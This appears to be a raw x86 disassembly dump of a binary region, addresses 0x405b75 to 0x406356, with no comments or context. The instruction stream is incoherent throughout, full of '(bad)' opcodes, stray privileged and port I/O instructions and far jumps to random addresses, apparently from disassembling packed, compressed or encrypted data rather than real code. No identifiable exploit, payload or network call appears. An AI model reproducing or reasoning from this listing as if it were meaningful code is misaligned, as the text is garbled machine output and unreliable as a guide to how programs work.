  405b75:	mov    ah,0x61
  405b77:	lahf   
  405b78:	lds    ebp,FWORD PTR [ebp-0x80]
  405b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b7c:	jecxz  0x405bec
  405b7e:	inc    ecx
  405b7f:	out    0xbb,al
  405b81:	push   eax
  405b82:	enter  0x6f36,0x29
  405b86:	sbb    ecx,DWORD PTR [ebp+edi*1-0xe]
  405b8a:	cmp    ch,BYTE PTR [ecx+eax*2]
  405b8d:	sub    ebx,edx
  405b8f:	dec    ebp
  405b90:	inc    edi
  405b91:	mov    bh,0xe4
  405b93:	xor    eax,0x446d9871
  405b98:	mov    al,0x44
  405b9a:	add    esp,DWORD PTR [edi]
  405b9c:	dec    ebp
  405b9d:	sbb    ch,cl
  405b9f:	jl     0x405bfc
  405ba1:	(bad)  
  405ba2:	imul   eax,DWORD PTR [edx+eax*8+0x24644d86],0x72
  405baa:	jnp    0x405ba4
  405bac:	in     eax,0xca
  405bae:	jno    0x405c26
  405bb0:	(bad)  
  405bb1:	in     eax,dx
  405bb2:	push   0x938232d2
  405bb7:	push   ebx
  405bb8:	ss (bad) 
  405bba:	and    eax,0x2be0ae5e
  405bbf:	and    bl,BYTE PTR [ecx+0x29]
  405bc2:	and    eax,0x2745874e
  405bc7:	push   ss
  405bc8:	not    BYTE PTR [edi-0xc]
  405bcb:	mov    dl,0xe7
  405bcd:	js     0x405b5a
  405bcf:	icebp  
  405bd0:	ss (bad) 
  405bd2:	loopne 0x405bc7
  405bd4:	pop    edx
  405bd5:	and    bh,BYTE PTR [esi-0x3e]
  405bd8:	xchg   edi,eax
  405bd9:	retf   
  405bda:	or     DWORD PTR [ecx],esi
  405bdc:	inc    esp
  405bdd:	cli    
  405bde:	sub    DWORD PTR [edi],ebx
  405be0:	lock xor dh,cl
  405be3:	repz jbe 0x405ba2
  405be6:	call   0xfa611a88
  405beb:	pop    ds
  405bec:	adc    al,0xf1
  405bee:	lea    ebx,[ebx]
  405bf0:	ins    DWORD PTR es:[edi],dx
  405bf1:	sub    al,0xc6
  405bf3:	test   BYTE PTR [esi+0x52004643],al
  405bf9:	inc    edx
  405bfa:	pop    es
  405bfb:	xchg   BYTE PTR [ecx],al
  405bfd:	pop    edi
  405bfe:	pop    ebx
  405bff:	pop    esp
  405c00:	push   edi
  405c01:	(bad)  
  405c02:	xchg   esi,eax
  405c03:	mov    dh,0xc2
  405c05:	pop    ebp
  405c06:	jo     0x405c14
  405c08:	stos   BYTE PTR es:[edi],al
  405c09:	jmp    0xfb0a:0x11d7039f
  405c10:	mov    al,ds:0xb6ca96aa
  405c15:	xor    BYTE PTR [esi],al
  405c17:	(bad)  
  405c18:	mov    esi,ebp
  405c1a:	frstor [edx]
  405c1c:	jne    0x405c41
  405c1e:	aam    0x5d
  405c20:	adc    DWORD PTR [ecx+0x4d6f5ecd],ebp
  405c26:	xor    BYTE PTR [esi+0x46],bl
  405c29:	dec    edi
  405c2a:	rol    DWORD PTR [ebx],0xc9
  405c2d:	mov    dh,0xec
  405c2f:	jmp    0x405bdd
  405c31:	xchg   ebx,eax
  405c32:	pop    ebx
  405c33:	pop    ebx
  405c34:	mov    eax,DWORD PTR [edi]
  405c36:	mov    BYTE PTR [ebx+0x2e],bl
  405c39:	xchg   esp,eax
  405c3a:	dec    edi
  405c3b:	or     eax,0xa80812b7
  405c40:	into   
  405c41:	add    bl,cl
  405c43:	mov    BYTE PTR [edi],ah
  405c45:	into   
  405c46:	pop    ebx
  405c47:	addr16 leave 
  405c49:	push   ebx
  405c4a:	popf   
  405c4b:	cmp    eax,0x36a3d5bf
  405c50:	arpl   WORD PTR [edx-0x11057d67],di
  405c56:	dec    ebp
  405c57:	push   esp
  405c58:	sub    al,0xa5
  405c5a:	jmp    0x1591:0xa44d9492
  405c61:	aam    0x2e
  405c63:	cdq    
  405c64:	pop    ss
  405c65:	aam    0xe8
  405c67:	pop    edx
  405c68:	in     eax,0x8a
  405c6a:	mov    edx,0xd20d30cf
  405c6f:	and    DWORD PTR [ebp-0x6be78125],esp
  405c75:	ror    ebp,1
  405c77:	lods   eax,DWORD PTR ds:[esi]
  405c78:	cdq    
  405c79:	cmp    al,0x39
  405c7b:	fstp   st(2)
  405c7d:	pop    esp
  405c7e:	(bad)  
  405c80:	pop    ebp
  405c81:	shl    BYTE PTR [ecx+0x75],1
  405c84:	fcom   QWORD PTR [eax+ebx*1]
  405c87:	inc    ebp
  405c88:	and    BYTE PTR [ebx],ah
  405c8a:	mov    esp,0x8c00e621
  405c8f:	mov    ds:0xa0a849d,al
  405c94:	std    
  405c95:	jp     0x405c52
  405c97:	outs   dx,DWORD PTR ds:[esi]
  405c98:	xor    al,0x4d
  405c9a:	retf   0xb7be
  405c9d:	xchg   eax,eax
  405c9f:	pop    ebx
  405ca0:	xchg   edi,eax
  405ca1:	and    BYTE PTR [edx],al
  405ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ca4:	fcomp  DWORD PTR [esi+esi*2]
  405ca7:	xor    al,0xb4
  405ca9:	fdivr  st(7),st
  405cab:	add    ch,BYTE PTR [eax+0x448d241d]
  405cb1:	stc    
  405cb2:	xlat   BYTE PTR ds:[ebx]
  405cb3:	push   eax
  405cb4:	aas    
  405cb5:	mov    bl,0x43
  405cb7:	retf   
  405cb8:	popa   
  405cb9:	nop
  405cba:	jns    0x405d1d
  405cbc:	(bad)  
  405cbd:	jmp    0x3720:0x7711f8ea
  405cc4:	pop    ecx
  405cc5:	pop    es
  405cc6:	sub    dl,ah
  405cc8:	sub    dh,cl
  405cca:	repnz cwde 
  405ccc:	xor    eax,0x64367b1b
  405cd1:	mov    dl,0x74
  405cd3:	and    eax,0x8320e34b
  405cd8:	or     BYTE PTR [edx+0x49f823af],bh
  405cde:	bound  esp,QWORD PTR [esi+0x71537574]
  405ce4:	jge    0x405cf9
  405ce6:	hlt    
  405ce7:	push   ecx
  405ce8:	mov    ch,BYTE PTR [esi]
  405cea:	inc    ebp
  405ceb:	inc    esp
  405cec:	xor    BYTE PTR [ebp+0x7bf53b55],dh
  405cf2:	std    
  405cf3:	sub    DWORD PTR [edx-0x16aa84b5],0x29
  405cfa:	push   ds
  405cfb:	mov    ds:0x8d80ca8f,al
  405d00:	xlat   BYTE PTR ds:[ebx]
  405d01:	push   edi
  405d02:	mov    al,0xd4
  405d04:	cmp    cl,BYTE PTR [ecx+0x4eb05f02]
  405d0a:	mov    eax,ds:0x738caabc
  405d0f:	cli    
  405d10:	popa   
  405d11:	xor    al,0x77
  405d13:	ins    BYTE PTR es:[edi],dx
  405d14:	and    esp,DWORD PTR [edx-0x54978463]
  405d1a:	aad    0x1a
  405d1c:	xchg   ebx,ebx
  405d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d1f:	inc    esi
  405d20:	and    al,0x3c
  405d22:	ins    DWORD PTR es:[edi],dx
  405d23:	cmp    edx,DWORD PTR [ecx-0x2fb19542]
  405d29:	out    dx,eax
  405d2a:	outs   dx,DWORD PTR ds:[esi]
  405d2b:	and    edi,DWORD PTR [eax+0x45]
  405d2e:	cld    
  405d2f:	cdq    
  405d30:	cmp    BYTE PTR [eax+0x71],bl
  405d33:	and    al,0x33
  405d35:	call   0xe924:0x48e09126
  405d3c:	shl    BYTE PTR [esi-0x1d1f1838],1
  405d42:	pop    edx
  405d43:	pop    eax
  405d44:	inc    ecx
  405d45:	arpl   WORD PTR [ebx],bx
  405d47:	jns    0x405d79
  405d49:	jle    0x405d96
  405d4b:	int3   
  405d4c:	jmp    0xeef1:0x3a71b8ea
  405d53:	iret   
  405d54:	fs jg  0x405dac
  405d57:	xchg   esi,eax
  405d58:	fldenv [edx-0x7]
  405d5b:	jge    0x405d32
  405d5d:	push   ss
  405d5e:	jge    0x405da9
  405d60:	ja     0x405d0b
  405d62:	lea    ebx,[eax-0x5]
  405d65:	xchg   ecx,eax
  405d66:	out    dx,eax
  405d67:	xor    al,BYTE PTR [esi]
  405d69:	jg     0x405dcb
  405d6b:	and    dl,BYTE PTR [eax-0x74]
  405d6e:	imul   edi,DWORD PTR [esi+0x611a437d],0x8eebe0c0
  405d78:	sbb    BYTE PTR [eax-0x56],bh
  405d7b:	cmp    al,0xe9
  405d7d:	mov    ds:0x186d884c,eax
  405d82:	cmp    eax,0xd0b0ab38
  405d87:	sbb    ebp,0xffffffa2
  405d8a:	adc    DWORD PTR [eax+0x513202ab],0x72
  405d91:	addr16 xchg esp,eax
  405d93:	inc    edx
  405d94:	lods   al,BYTE PTR ds:[esi]
  405d95:	fs mov edi,0xe15c3a70
  405d9b:	adc    al,0x64
  405d9d:	add    ah,dl
  405d9f:	int    0x52
  405da1:	mov    bl,0x79
  405da3:	inc    DWORD PTR [ebx-0x46a109d]
  405da9:	or     eax,0x153de34b
  405dae:	loop   0x405ddd
  405db0:	cmp    DWORD PTR [ebx+0x33a72736],ebx
  405db6:	les    esp,FWORD PTR [eax]
  405db8:	xchg   edx,eax
  405db9:	mov    eax,0x6ac7e79e
  405dbe:	sbb    dl,al
  405dc0:	mov    eax,0x3d1f5254
  405dc5:	adc    cl,bl
  405dc7:	sahf   
  405dc8:	xchg   esi,eax
  405dc9:	sub    DWORD PTR [esi+0x5db1a989],edi
  405dcf:	fdiv   DWORD PTR [esi+edi*4]
  405dd2:	shl    DWORD PTR [edx+0x7],0xd6
  405dd6:	xor    edx,DWORD PTR [edi+0x4c]
  405dd9:	cmp    BYTE PTR [ebx],0x4a
  405ddc:	mov    bh,0xfc
  405dde:	fdiv   QWORD PTR [ebp+edx*4-0x5cb3d460]
  405de5:	or     ebp,DWORD PTR [eax-0x5b9600dd]
  405deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dec:	or     eax,0xc6345b12
  405df1:	sbb    ecx,DWORD PTR [edx+0x6d50bbf5]
  405df7:	add    al,0xf3
  405df9:	xchg   BYTE PTR [ebx+0x3d],ch
  405dfc:	mov    cl,0xb
  405dfe:	mov    ecx,es
  405e00:	push   esi
  405e01:	add    edx,DWORD PTR [edi-0x25a20dce]
  405e07:	lahf   
  405e08:	xchg   esp,eax
  405e09:	xor    ah,BYTE PTR [edx+0x4a2cb301]
  405e0f:	add    eax,0x65c758c5
  405e14:	fisttp QWORD PTR [edx-0x187a7479]
  405e1a:	mov    DWORD PTR [ebp-0x5f],ebp
  405e1d:	or     al,0x3
  405e1f:	sub    al,0x4
  405e21:	sub    edx,DWORD PTR [esi]
  405e23:	std    
  405e24:	mov    al,0xea
  405e26:	aaa    
  405e27:	popf   
  405e28:	pop    ds
  405e29:	mov    bl,0x63
  405e2b:	push   ds
  405e2c:	dec    edx
  405e2d:	sub    dh,BYTE PTR [ecx+0x22]
  405e30:	inc    esi
  405e31:	cmp    eax,0x7442ae9
  405e36:	clc    
  405e37:	jl     0x405e74
  405e39:	mov    bl,0x55
  405e3b:	mov    ecx,DWORD PTR [ebp+esi*2-0x7f8912bf]
  405e42:	cmc    
  405e43:	les    eax,FWORD PTR [esp+ebp*4-0x71]
  405e47:	call   0xacf5206f
  405e4c:	pop    ebx
  405e4d:	jno    0x405e1c
  405e4f:	daa    
  405e50:	sbb    DWORD PTR [ebp-0x6a],eax
  405e53:	std    
  405e54:	stos   DWORD PTR es:[edi],eax
  405e55:	push   ebp
  405e56:	outs   dx,BYTE PTR ds:[esi]
  405e57:	xchg   esp,eax
  405e58:	sub    BYTE PTR [esi-0x4446c618],ah
  405e5e:	push   cs
  405e5f:	cwde   
  405e60:	fstp   QWORD PTR [edi+0x25]
  405e63:	and    ebp,ebp
  405e65:	jp     0x405ea1
  405e67:	dec    eax
  405e68:	mov    ah,0xec
  405e6a:	cwde   
  405e6b:	push   ss
  405e6c:	mov    ds:0x6879590a,al
  405e71:	jno    0x405ee0
  405e73:	repnz sub edi,DWORD PTR [esi-0x5e]
  405e77:	cmp    bh,BYTE PTR [eax+0x526a30b9]
  405e7d:	jmp    0x664eca53
  405e82:	sbb    BYTE PTR [edi],dl
  405e84:	sbb    eax,DWORD PTR [ebp+0x9]
  405e87:	scas   eax,DWORD PTR es:[edi]
  405e88:	fld    QWORD PTR [esi-0x47]
  405e8b:	aaa    
  405e8c:	stos   DWORD PTR es:[edi],eax
  405e8d:	fdiv   QWORD PTR [edx]
  405e8f:	inc    bp
  405e91:	jmp    0x405e95
  405e93:	fisubr DWORD PTR ds:0xe3e0d42f
  405e99:	push   eax
  405e9a:	mov    ah,0x97
  405e9c:	test   BYTE PTR [ecx],dl
  405e9e:	pusha  
  405e9f:	push   edi
  405ea0:	ja     0x405e32
  405ea2:	lods   al,BYTE PTR ds:[esi]
  405ea3:	cmp    eax,0x9528df8c
  405ea8:	dec    ecx
  405ea9:	xchg   esp,eax
  405eaa:	not    BYTE PTR [ecx+0x1e]
  405ead:	cmc    
  405eae:	shl    DWORD PTR [ebx+0x3b],0x15
  405eb2:	dec    eax
  405eb3:	aad    0x81
  405eb5:	cmp    BYTE PTR [ebx],bl
  405eb7:	scas   al,BYTE PTR es:[edi]
  405eb8:	retf   
  405eb9:	js     0x405ea6
  405ebb:	inc    eax
  405ebc:	stos   BYTE PTR es:[edi],al
  405ebd:	mov    BYTE PTR [ebx-0x42dae317],0x7c
  405ec4:	push   esp
  405ec5:	sahf   
  405ec6:	jp     0x405e86
  405ec8:	test   eax,0xf9d37ad5
  405ecd:	push   es
  405ece:	sbb    dl,ch
  405ed0:	push   edx
  405ed1:	in     eax,0x83
  405ed3:	sub    BYTE PTR [ebp+0x24ec314a],al
  405ed9:	xchg   cl,ah
  405edb:	sti    
  405edc:	mov    ah,0x98
  405ede:	inc    edx
  405edf:	cwde   
  405ee0:	mov    al,ds:0x67cc7847
  405ee5:	push   ds
  405ee6:	lock stos BYTE PTR es:[edi],al
  405ee8:	sub    al,0x6b
  405eea:	mov    eax,ds:0x1d79578c
  405eef:	int    0x38
  405ef1:	imul   dh
  405ef3:	sti    
  405ef4:	push   ebx
  405ef5:	mov    esi,0x271d1343
  405efa:	(bad)  
  405efb:	jmp    DWORD PTR [ebx+eax*2]
  405efe:	sar    BYTE PTR [ebp-0x2a],1
  405f01:	mov    cs,esi
  405f03:	jno    0x405ec0
  405f05:	inc    edx
  405f06:	shr    DWORD PTR [ecx-0x4f],cl
  405f09:	in     eax,0x1c
  405f0b:	ins    BYTE PTR es:[edi],dx
  405f0c:	ja     0x405ee2
  405f0e:	xor    eax,0xec09deae
  405f13:	inc    esi
  405f14:	dec    esi
  405f15:	jnp    0x405f95
  405f17:	dec    ecx
  405f18:	jp     0x405f98
  405f1a:	and    DWORD PTR [ebp-0x9990bc1],esp
  405f20:	sbb    al,0xe9
  405f22:	xor    BYTE PTR [bx],bh
  405f25:	push   ds
  405f26:	adc    bx,WORD PTR ds:0x4821381e
  405f2d:	or     DWORD PTR [edx-0x56a16ff6],0xffffffcf
  405f34:	call   0x30a3:0x727a9cda
  405f3b:	jne    0x405ef4
  405f3d:	adc    dh,bh
  405f3f:	pop    ecx
  405f40:	sub    al,0x74
  405f42:	sbb    al,ah
  405f44:	fcomp  QWORD PTR [ecx-0x60]
  405f47:	adc    eax,0x2c6f84aa
  405f4c:	cld    
  405f4d:	aad    0x78
  405f4f:	mov    dh,0xbd
  405f51:	mov    esp,0x9535990d
  405f56:	mov    cl,0xc0
  405f58:	mov    ah,0xba
  405f5a:	cs cmp ah,0x7d
  405f5e:	mov    WORD PTR [ecx],gs
  405f60:	and    al,0xee
  405f62:	jp     0x405f61
  405f64:	or     dh,BYTE PTR ds:0x660786ef
  405f6a:	adc    BYTE PTR [ebx-0x13],cl
  405f6d:	in     eax,0x6f
  405f6f:	push   ebp
  405f70:	stos   DWORD PTR es:[edi],eax
  405f71:	xor    ah,dl
  405f73:	mov    edx,0xf01c7240
  405f78:	mov    DWORD PTR [edx+0x73],edx
  405f7b:	push   eax
  405f7c:	ror    dh,1
  405f7e:	mov    ecx,0xffeb293
  405f83:	rcl    DWORD PTR [ecx+0x59d1f9d4],0x2b
  405f8a:	mov    cl,bh
  405f8c:	dec    edx
  405f8d:	sbb    BYTE PTR [edx+ecx*8+0x2796ef10],cl
  405f94:	ficom  DWORD PTR [edx-0x67]
  405f97:	mov    ebp,0xd1fa3c71
  405f9c:	js     0x405fbd
  405f9e:	std    
  405f9f:	pop    es
  405fa0:	and    eax,edi
  405fa2:	mov    bl,0x44
  405fa4:	test   esp,ebx
  405fa6:	xchg   esp,eax
  405fa7:	xchg   esp,eax
  405fa8:	push   0x524a0bf4
  405fad:	repz sti 
  405faf:	jo     0x405f6b
  405fb1:	dec    eax
  405fb2:	arpl   WORD PTR [edx-0x7e94b2d6],si
  405fb8:	std    
  405fb9:	shl    BYTE PTR ds:0x2a14d64,cl
  405fbf:	retf   
  405fc0:	mov    al,ds:0xe50320ea
  405fc5:	sub    al,0xdf
  405fc7:	and    edx,DWORD PTR [edx]
  405fc9:	je     0x406012
  405fcb:	jg     0x405f9d
  405fcd:	push   esp
  405fce:	add    DWORD PTR cs:[ecx+0x56b686f3],edx
  405fd5:	add    al,0xb7
  405fd7:	adc    DWORD PTR [ecx-0x24],ebx
  405fda:	xchg   ecx,eax
  405fdb:	je     0x406045
  405fdd:	adc    al,BYTE PTR [ecx]
  405fdf:	(bad)  
  405fe1:	and    eax,0x767774d5
  405fe6:	outs   dx,BYTE PTR ds:[esi]
  405fe7:	jnp    0x40603a
  405fe9:	jbe    0x405ff8
  405feb:	mov    ebx,0x6d55a592
  405ff0:	xor    cl,bh
  405ff2:	adc    DWORD PTR [edx+0x1],ebx
  405ff5:	push   ebp
  405ff6:	pop    ds
  405ff7:	mov    edi,0xb0007c81
  405ffc:	mov    dh,0xee
  405ffe:	fidivr WORD PTR [ebx-0x38]
  406001:	sub    cl,cl
  406003:	sbb    edi,DWORD PTR [edi-0x5e]
  406006:	xchg   ah,cl
  406008:	add    al,BYTE PTR [ebp+0x6c08a9ee]
  40600e:	mov    ecx,0x5c3d1a5a
  406013:	lock mov bh,0xc9
  406016:	sbb    edi,DWORD PTR [ecx-0x22f756e3]
  40601c:	fdivr  QWORD PTR [esi]
  40601e:	mov    al,ds:0xadf41cd
  406023:	sahf   
  406024:	pop    ds
  406025:	jmp    0x40603e
  406027:	and    al,BYTE PTR [ecx+0x303b448f]
  40602d:	push   0x6b126c71
  406032:	inc    esp
  406033:	cli    
  406034:	mov    bh,0x70
  406036:	scas   al,BYTE PTR es:[edi]
  406037:	cmovl  edx,DWORD PTR [edi-0x32d428ac]
  40603e:	push   ss
  40603f:	cmp    esp,ebx
  406041:	out    dx,eax
  406042:	in     eax,0xa
  406044:	(bad)  
  406045:	cmp    al,cl
  406047:	rcr    BYTE PTR [ebp-0x5b],1
  40604a:	movd   DWORD PTR [edx+0x1d],mm0
  40604e:	add    BYTE PTR [eax-0xb],dh
  406051:	sub    BYTE PTR [ebx],dl
  406053:	mov    al,ds:0x2f19f66
  406058:	mov    ebp,0x841a404
  40605d:	mov    ch,BYTE PTR [edi]
  40605f:	repnz retfw 
  406062:	inc    edi
  406063:	jne    0x406054
  406065:	push   ebp
  406066:	fcmovnu st,st(4)
  406068:	jae    0x4060bd
  40606a:	sar    BYTE PTR [eax+0x49d0c60b],0x51
  406071:	fsubr  st(4),st
  406073:	inc    edi
  406074:	shr    ecx,cl
  406076:	xchg   ecx,eax
  406077:	add    eax,0x11bb8f5c
  40607c:	xor    DWORD PTR [edi+0x1ceb82fc],ecx
  406082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406083:	imul   esi,DWORD PTR [ebp-0x65],0xffffffb5
  406087:	retf   0x2c81
  40608a:	cwde   
  40608b:	es ret 0xe04a
  40608f:	push   ecx
  406090:	sbb    eax,0x7ea5295b
  406095:	cld    
  406096:	xor    edx,DWORD PTR [edx-0x6bdcdfaf]
  40609c:	cmc    
  40609d:	dec    edx
  40609e:	add    ch,ch
  4060a0:	push   ebp
  4060a1:	lock mov esp,DWORD PTR [ecx+ebp*8-0x77a40271]
  4060a9:	(bad)  
  4060aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ab:	or     al,BYTE PTR [ecx+eax*4-0x54]
  4060af:	mov    dh,0x81
  4060b1:	in     al,0x40
  4060b3:	mov    ch,0x3e
  4060b5:	mov    ds,WORD PTR [eax+0x50708104]
  4060bb:	pop    ecx
  4060bc:	(bad)  
  4060c0:	mov    edx,DWORD PTR [ebx+ebp*8+0x1f]
  4060c4:	sbb    al,0x8e
  4060c6:	cmp    dh,ch
  4060c8:	addr16 add al,0xcc
  4060cb:	sbb    al,0x45
  4060cd:	leave  
  4060ce:	mov    esi,0x41a827f5
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	mov    edx,esp
  4060d6:	add    DWORD PTR [edx],0xffffffe7
  4060d9:	add    eax,0x8719b8de
  4060de:	popf   
  4060df:	dec    esp
  4060e0:	jbe    0x4060d3
  4060e2:	and    DWORD PTR [ebx+0x2e004c9c],esp
  4060e8:	adc    DWORD PTR [ebx-0x5d],edx
  4060eb:	jb     0x406158
  4060ed:	sub    ebp,esi
  4060ef:	lods   al,BYTE PTR ds:[esi]
  4060f0:	popa   
  4060f1:	enter  0xcdf7,0x92
  4060f5:	and    al,0xef
  4060f7:	loope  0x4060c7
  4060f9:	stos   BYTE PTR es:[edi],al
  4060fa:	sub    edx,DWORD PTR [edi+edx*1-0x26]
  4060fe:	add    BYTE PTR [eax+0x2504507],dl
  406104:	jb     0x406153
  406106:	xchg   DWORD PTR [ecx],ecx
  406108:	inc    esp
  406109:	dec    edx
  40610a:	cmp    esp,DWORD PTR [eax-0x75]
  40610d:	jo     0x406162
  40610f:	fnsave [ecx]
  406111:	je     0x4060de
  406113:	xor    eax,0x5fe7b0ab
  406118:	adc    DWORD PTR [eax+ebx*1],0x4c
  40611c:	ss sub dh,dl
  40611f:	pop    ds
  406120:	sbb    eax,0x1e33047f
  406125:	out    0x89,al
  406127:	ins    DWORD PTR es:[edi],dx
  406128:	xor    ecx,DWORD PTR [edi-0xd]
  40612b:	adc    ebp,0x9f5b2288
  406131:	shr    edx,cl
  406133:	stos   BYTE PTR es:[edi],al
  406134:	jbe    0x406118
  406136:	xchg   esi,eax
  406137:	retf   
  406138:	lock (bad) [ecx+0x38]
  40613c:	icebp  
  40613d:	into   
  40613e:	fcomp  DWORD PTR [esi]
  406140:	mov    bl,0x9a
  406142:	jp     0x406111
  406144:	sti    
  406145:	test   BYTE PTR [edi+0x5c],ch
  406148:	gs cmp al,0xb6
  40614b:	or     bl,cl
  40614d:	inc    eax
  40614e:	inc    edx
  40614f:	leave  
  406150:	call   0xb395:0x60d48cf3
  406157:	sbb    ecx,0x2f608fce
  40615d:	out    dx,eax
  40615e:	jne    0x406111
  406160:	addr16 rcl dh,0x90
  406164:	mov    eax,ds:0xcb80285e
  406169:	push   0x42a621ca
  40616e:	push   ecx
  40616f:	and    DWORD PTR [edx],esi
  406171:	xor    DWORD PTR [ecx+0x6],0xb7d475b0
  406178:	test   al,0xa0
  40617a:	mov    bl,BYTE PTR [esi]
  40617c:	adc    al,0x48
  40617e:	sub    eax,0xa3794ca3
  406183:	mov    esp,0xceb30345
  406188:	add    ah,bl
  40618a:	jns    0x4061ed
  40618c:	mov    esp,0x64595197
  406191:	dec    eax
  406192:	fcom   QWORD PTR [eax]
  406194:	sti    
  406195:	xchg   edx,eax
  406196:	shl    DWORD PTR [esi+0x5ea96f1f],cl
  40619c:	jge    0x4061ca
  40619e:	aaa    
  40619f:	and    eax,0xa5e95f79
  4061a4:	push   edi
  4061a5:	or     ch,BYTE PTR [ecx+eax*4]
  4061a8:	mov    dl,BYTE PTR [edi+0x7bca7d6a]
  4061ae:	mov    bl,0x14
  4061b0:	aas    
  4061b1:	aas    
  4061b2:	sub    ah,BYTE PTR [ebx]
  4061b4:	push   es
  4061b5:	xchg   edi,eax
  4061b6:	pusha  
  4061b7:	xchg   edx,eax
  4061b8:	leave  
  4061b9:	or     BYTE PTR [eax+edx*2],dh
  4061bc:	ins    DWORD PTR es:[edi],dx
  4061bd:	jnp    0x4061ba
  4061bf:	aad    0xff
  4061c1:	ror    DWORD PTR [ebx-0x71a4ea36],1
  4061c7:	sbb    DWORD PTR [edx+0x22034bb],edx
  4061cd:	adc    BYTE PTR [edi+0x44d8c820],cl
  4061d3:	inc    edi
  4061d4:	push   ebx
  4061d5:	push   DWORD PTR [ebp+0x5b]
  4061d8:	mov    dh,0xab
  4061da:	or     DWORD PTR [eax+eax*2-0x1c],ebx
  4061de:	popf   
  4061df:	std    
  4061e0:	and    eax,DWORD PTR ds:0xe2216133
  4061e6:	sub    ah,BYTE PTR [ebx+0x498fd5ec]
  4061ec:	int    0x96
  4061ee:	dec    eax
  4061ef:	or     eax,0x7df594
  4061f4:	bound  ecx,QWORD PTR [esp+ebx*1+0x30b8af2a]
  4061fb:	xchg   esp,eax
  4061fc:	pop    ss
  4061fd:	mov    ecx,0xd28ff5a3
  406202:	jl     0x4061d8
  406204:	dec    ebx
  406205:	sub    bl,ch
  406207:	idiv   BYTE PTR [esi+0x3]
  40620a:	aad    0xc1
  40620c:	je     0x406196
  40620e:	jo     0x4061cb
  406210:	(bad)  
  406211:	mov    bl,0xce
  406213:	leave  
  406214:	sbb    eax,0x6ed18354
  406219:	pop    esi
  40621a:	mov    bh,0x6c
  40621c:	add    esi,DWORD PTR [ecx]
  40621e:	jl     0x4061f6
  406220:	mov    edi,0x295b5948
  406225:	cs call 0x117b:0xb9875938
  40622d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40622e:	clc    
  40622f:	shl    DWORD PTR [ebx],1
  406231:	sub    dl,cl
  406233:	ja     0x406206
  406235:	les    ecx,FWORD PTR [edi+0x71ca158e]
  40623b:	add    BYTE PTR [edi-0x261f1eb3],ah
  406241:	xor    eax,0x4117662d
  406246:	add    dh,bh
  406248:	ret    0x2433
  40624b:	push   ebx
  40624c:	pop    ecx
  40624d:	lea    ebx,[esi]
  40624f:	xchg   BYTE PTR [eiz*4+0x62457c8a],dh
  406256:	adc    al,0x4
  406258:	pop    ds
  406259:	inc    esi
  40625a:	lods   eax,DWORD PTR ds:[esi]
  40625b:	sti    
  40625c:	popf   
  40625d:	xchg   edx,eax
  40625e:	aad    0xf0
  406260:	lock push ebp
  406262:	enter  0x9a6,0x4e
  406266:	add    BYTE PTR [edi-0x19],0x4b
  40626a:	sub    bh,BYTE PTR [edi*4+0x6e6332cd]
  406271:	xor    ebp,DWORD PTR [ecx]
  406273:	test   eax,0x507c08f5
  406278:	sbb    dl,0xf0
  40627b:	cld    
  40627c:	es and al,0xe2
  40627f:	gs xor al,0xa4
  406282:	sbb    eax,0x5d5cad73
  406287:	inc    esi
  406288:	lds    ebp,FWORD PTR [ecx-0x23]
  40628b:	mov    BYTE PTR [ecx+ebp*1+0x7f15e9bf],0x53
  406293:	jg     0x40628d
  406295:	jnp    0x4062ee
  406297:	or     eax,0xb2d1c1cf
  40629c:	adc    ch,BYTE PTR [edx]
  40629e:	(bad)  
  40629f:	and    eax,0xb4800d0b
  4062a4:	aaa    
  4062a5:	xchg   ebx,eax
  4062a6:	xlat   BYTE PTR ds:[ebx]
  4062a7:	arpl   sp,cx
  4062a9:	call   DWORD PTR [ecx-0x3a]
  4062ac:	call   0x603f48c5
  4062b1:	mov    al,0xae
  4062b3:	jge    0x406270
  4062b5:	dec    eax
  4062b6:	mov    al,BYTE PTR [esi]
  4062b8:	inc    eax
  4062b9:	mov    BYTE PTR [ebx],ch
  4062bb:	pop    es
  4062bc:	in     al,0xca
  4062be:	add    bh,BYTE PTR [ebp+0x59]
  4062c1:	repnz mov ebx,0xe644ff2a
  4062c7:	push   ecx
  4062c8:	je     0x4062c7
  4062ca:	push   edx
  4062cb:	scas   al,BYTE PTR es:[edi]
  4062cc:	dec    ecx
  4062cd:	mov    ds:0xfc96f8d4,al
  4062d2:	jecxz  0x4062a5
  4062d4:	test   DWORD PTR [esi+ebx*4],edi
  4062d7:	add    eax,0x29863e54
  4062dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062dd:	add    esp,DWORD PTR [edi-0x58c0a39b]
  4062e3:	not    DWORD PTR [edx-0x35ada74a]
  4062e9:	daa    
  4062ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062eb:	mov    edx,0x75b8957d
  4062f0:	mov    BYTE PTR [ebp-0x7b],al
  4062f3:	mov    bh,0x62
  4062f5:	push   0xffffffd6
  4062f7:	mov    ax,0x7d98
  4062fb:	mov    ecx,0x80005474
  406300:	data16 int3 
  406302:	push   es
  406303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406304:	jmp    0x406359
  406306:	xchg   esp,eax
  406307:	push   ds
  406308:	push   es
  406309:	ficom  WORD PTR [edx]
  40630b:	gs (bad) 
  40630d:	out    0x58,eax
  40630f:	cs mov edx,0xbb71fda3
  406315:	push   0x5d
  406317:	sub    DWORD PTR [eax-0x2fe75aa1],ebp
  40631d:	fidivr DWORD PTR [ebx-0x48f4ea4]
  406323:	jmp    0xcae:0xae213e54
  40632a:	mov    ah,0x17
  40632c:	fcom   DWORD PTR fs:[ebx]
  40632f:	outs   dx,DWORD PTR ds:[esi]
  406330:	les    esi,FWORD PTR [ebx-0x28]
  406333:	jl     0x406355
  406335:	test   esp,0xe4fbb44c
  40633b:	ss push edx
  40633d:	cmp    dh,cl
  40633f:	push   esi
  406340:	add    al,0xca
  406342:	push   es
  406343:	sbb    ebp,edx
  406345:	jno    0x406310
  406347:	sub    al,ah
  406349:	push   esi
  40634a:	call   0x2b0c:0x70acb1e2
  406351:	mov    edx,0x1e025f1a
  406356:	rol    BYTE PTR [eax+0x62],1
